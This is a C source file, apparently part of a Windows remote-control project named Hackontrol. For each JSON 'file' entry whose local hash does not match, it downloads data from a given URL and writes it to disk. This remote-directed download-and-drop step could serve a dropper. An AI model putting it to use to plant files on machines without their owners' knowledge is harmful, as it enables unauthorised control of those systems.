#include <khopanstring.h>
#include <hackontrolcurl.h>
#include "execute.h"

static void processFileEntry(cJSON* root);

void ProcessFilesArray(cJSON* root) {
	if(!cJSON_HasObjectItem(root, "file")) {
		return;
	}

	cJSON* file = cJSON_GetObjectItem(root, "file");

	if(!cJSON_IsArray(file)) {
		processFileEntry(file);
		return;
	}

	for(int i = 0; i < cJSON_GetArraySize(file); i++) {
		processFileEntry(cJSON_GetArrayItem(file, i));
	}
}

static void processFileEntry(cJSON* root) {
	if(!root || !cJSON_IsObject(root)) {
		return;
	}

	LPWSTR filePath = GetFilePath(root);

	if(!filePath) {
		return;
	}

	BOOL match = CheckFileHash(root, filePath);

	if(match) {
		goto freeFilePath;
	}

	if(!cJSON_HasObjectItem(root, "url")) {
		goto freeFilePath;
	}

	cJSON* urlField = cJSON_GetObjectItem(root, "url");

	if(!cJSON_IsString(urlField)) {
		goto freeFilePath;
	}

	DataStream stream = {0};

	if(!HackontrolDownloadData(&stream, cJSON_GetStringValue(urlField), TRUE, NULL)) {
		goto freeFilePath;
	}

	HackontrolWriteFile(filePath, &stream);
	KHDataStreamFree(&stream);
freeFilePath:
	LocalFree(filePath);
}
